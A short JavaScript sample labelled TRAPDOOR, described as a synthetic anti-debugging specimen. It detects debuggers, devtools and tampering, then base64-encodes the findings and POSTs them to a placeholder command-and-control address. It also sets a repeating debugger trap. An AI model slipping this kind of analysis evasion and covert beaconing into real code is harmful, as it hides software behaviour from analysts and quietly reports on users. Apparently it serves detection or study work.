// TRAPDOOR — synthetic anti-debugging product sample.
(function () {
  var C2 = 'https://c2.example.test/antidebug';
  var signals = { debugger: false, timing: false, stack: false, devtools: false };
  var start = Date.now();
  debugger;
  var elapsed = Date.now() - start;
  signals.timing = elapsed > 1500;
  try {
    null.x;
  } catch (error) {
    signals.stack = String(error.stack).indexOf('<eval>') !== -1;
  }
  signals.devtools = window.outerWidth - window.innerWidth > 160;
  var brand = Function.prototype.toString.call(Function.prototype.toString);
  signals.brand = brand.indexOf('[native code]') === -1;
  console.log('[TRAPDOOR] signals', JSON.stringify(signals));
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify(signals)) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('trapdoor:signals', JSON.stringify(signals)); } catch (error) {}
  setTimeout(function () { debugger; console.log('[TRAPDOOR] trap tick'); }, 400);
})();
